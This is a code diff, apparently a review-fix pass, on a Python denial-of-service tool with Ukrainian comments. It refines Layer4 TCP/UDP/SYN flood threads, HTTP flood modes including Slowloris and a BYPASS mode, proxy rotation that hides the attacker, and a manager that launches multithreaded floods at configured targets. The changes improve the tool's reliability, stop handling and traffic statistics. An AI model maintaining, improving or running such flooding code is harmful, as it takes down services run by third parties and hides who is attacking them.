@@ -16,11 +16,12 @@ import time
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from contextlib import suppress
 from pathlib import Path
-from typing import Dict, List, Optional, Set, Tuple, Union
+from typing import Dict, List, Optional, Set, Tuple, Union  # Union for Py3.9; was dict | list (review fix)
 
 from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
 from PyRoxy import Tools as ProxyTools
 
+# Method sets used by validate_config() and AttackManager routing (review fix).
 L4_METHODS = frozenset({"TCP", "UDP", "SYN"})
 L7_METHODS = frozenset({"GET", "POST", "STRESS", "SLOW", "GSB", "BYPASS"})
 ALL_METHODS = L4_METHODS | L7_METHODS
@@ -40,6 +41,7 @@ logger.setLevel(logging.INFO)
 # Завантаження JSON
 # ----------------------------------------------------------------------
 def load_json_safe(filepath: Path) -> Union[dict, list]:
+    # Strict parse first; trailing-comma cleanup only on JSONDecodeError (review fix).
     raw = filepath.read_text(encoding="utf-8")
     try:
         return json.loads(raw)
@@ -49,6 +51,7 @@ def load_json_safe(filepath: Path) -> Union[dict, list]:
 
 
 def validate_config(config: dict) -> None:
+    # Validate config before threads start; replaces uncaught KeyError mid-spawn (review fix).
     if not isinstance(config, dict):
         raise ValueError("config must be a JSON object")
     targets = config.get("targets")
@@ -91,6 +94,7 @@ def validate_config(config: dict) -> None:
 
 
 def parse_l4_target(target_str: str) -> Tuple[str, int]:
+    # Single L4 parser with [ipv6]:port support; replaces fragile rsplit in spawn (review fix).
     if "://" in target_str:
         _, rest = target_str.split("://", 1)
     else:
@@ -124,6 +128,7 @@ def validate_proxy_providers(proxy_providers: list) -> None:
 
 
 def l7_stats_key(url: URL) -> str:
+    # Stats key is host:port so two URLs on same host do not merge (review fix).
     return url.authority or url.host or str(url)
 
 
@@ -154,6 +159,7 @@ class Tools:
 
     @staticmethod
     def sizeOfRequest(res) -> int:
+        # Count request body + response for BYPASS BPS accuracy (review fix).
         size = len(res.request.method or "")
         size += len(res.request.url or "")
         size += len('\r\n'.join(f'{k}: {v}' for k, v in res.request.headers.items()))
@@ -166,6 +172,7 @@ class Tools:
 # Layer4 атаки
 # ----------------------------------------------------------------------
 class Layer4(threading.Thread):
+    # Inner TCP/UDP/SYN loops use _running() so stop does not wait on socket failure (review fix).
     def __init__(self, target: Tuple[str, int], method: str = "TCP",
                  synevent: threading.Event = None,
                  target_key: str = None, stats_dict: dict = None, stats_lock: threading.Lock = None):
@@ -189,6 +196,7 @@ class Layer4(threading.Thread):
             self.SENT_FLOOD()
 
     def _update_stats(self, bytes_sent: int):
+        # Require stats_lock before acquiring it (review fix).
         if self.stats_dict is not None and self.target_key and self.stats_lock:
             with self.stats_lock:
                 if self.target_key not in self.stats_dict:
@@ -282,6 +290,7 @@ class HttpFlood(threading.Thread):
                 "https://drive.google.com/viewerng/viewer?url=",
             ]
         self._referers = list(referers)
+        # Always initialize list; prevents BYPASS random.choice on missing/empty _proxies (review fix).
         self._proxies = list(proxies) if proxies else []
 
         if not useragents:
@@ -318,6 +327,7 @@ class HttpFlood(threading.Thread):
                 self.stats_dict[self.target_key][1] += bytes_sent
 
     def _pick_proxy(self) -> Optional[Proxy]:
+        # Never random.choice an empty proxy list (review fix).
         if self._proxies:
             return random.choice(self._proxies)
         return None
@@ -349,7 +359,7 @@ class HttpFlood(threading.Thread):
                           (other or "") + "\r\n")
 
     def open_connection(self, host=None):
-        proxy = self._pick_proxy()
+        proxy = self._pick_proxy()  # centralized proxy pick (review fix)
         if proxy:
             sock = proxy.open_socket(socket.AF_INET, socket.SOCK_STREAM)
         else:
@@ -444,6 +454,7 @@ class HttpFlood(threading.Thread):
                     break
                 if s.send(payload):
                     self._update_stats(len(payload))
+            # Slowloris loop checks _running so stop ends keep-alive traffic (review fix).
             while self._running() and s.send(payload) and s.recv(1):
                 keep = f"X-a: {ProxyTools.Random.rand_int(1, 5000)}\r\n".encode()
                 if s.send(keep):
@@ -601,11 +612,12 @@ class AttackManager:
         self.target_stats: Dict[str, List[int]] = {}
         self.stats_lock = threading.Lock()
         self._proxy_list: Optional[List[Proxy]] = None
-        self._proxy_fetch_attempted = False
+        self._proxy_fetch_attempted = False  # replaces _proxies_loaded that stuck after failed fetch (review fix)
         self.target_keys: List[str] = []
         self.table_height = 0
 
     def _load_proxies_if_needed(self, proxy_enabled: int, check_url: str) -> Optional[List[Proxy]]:
+        # Cache [] on failure and log; do not mark loaded before checking result (review fix).
         if proxy_enabled == 0:
             return None
         if self._proxy_list is not None:
@@ -619,6 +631,7 @@ class AttackManager:
         return self._proxy_list or None
 
     def _join_workers(self, timeout: float = 5.0) -> None:
+        # Join workers on stop/restart to avoid duplicate daemon threads (review fix).
         deadline = time.time() + timeout
         for worker in self.threads:
             remaining = max(0.01, deadline - time.time())
@@ -627,6 +640,7 @@ class AttackManager:
         self.threads.clear()
 
     def _preview_target_keys(self) -> List[str]:
+        # Table layout before attack; paired with setup_console() instead of auto-start (review fix).
         keys = []
         for target in self.config.get("targets", []):
             method = target["method"].upper()
@@ -645,7 +659,7 @@ class AttackManager:
         return unique
 
     def _spawn_threads(self):
-        self._join_workers()
+        self._join_workers()  # drain old pool before creating new threads (review fix)
         target_keys = []
 
         settings = self.config.get("settings", {})
@@ -682,7 +696,7 @@ class AttackManager:
                 url = URL(target_str)
                 hostname = url.host
                 actual_ip = ip if ip else socket.gethostbyname(hostname)
-                key = l7_stats_key(url)
+                key = l7_stats_key(url)  # authority = host:port stats bucket (review fix)
                 target_keys.append(key)
                 proxies = self._load_proxies_if_needed(proxy_enabled, str(url))
                 for thread_id in range(threads):
@@ -710,6 +724,7 @@ class AttackManager:
         return max_table
 
     def setup_console(self) -> None:
+        # Show UI only; attack begins when user types start (review fix).
         self.target_keys = self._preview_target_keys()
         self.table_height = self._calculate_table_height()
         sys.stdout.write("\033[2J\033[H")
@@ -752,7 +767,7 @@ class AttackManager:
             logger.warning("Attack not running.")
             return
         self.event.clear()
-        self._join_workers()
+        self._join_workers()  # cooperative stop: threads exit inner loops then join (review fix)
         if self.monitor_thread and self.monitor_thread.is_alive():
             self.monitor_thread.join(timeout=1.0)
         logger.info("Attack stopped.")
@@ -761,7 +776,7 @@ class AttackManager:
 # Консоль
 # ----------------------------------------------------------------------
 def console(manager: AttackManager):
-    manager.setup_console()
+    manager.setup_console()  # was manager.start(); no longer auto-floods on launch (review fix)
 
     while True:
         prompt_row = manager.table_height + 1
@@ -802,7 +817,7 @@ def main():
         sys.exit(1)
 
     try:
-        config = load_json_safe(config_path)
+        config = load_json_safe(config_path)  # validate before AttackManager runs (review fix)
         proxy_providers = load_json_safe(proxy_path)
         validate_config(config)
         validate_proxy_providers(proxy_providers)
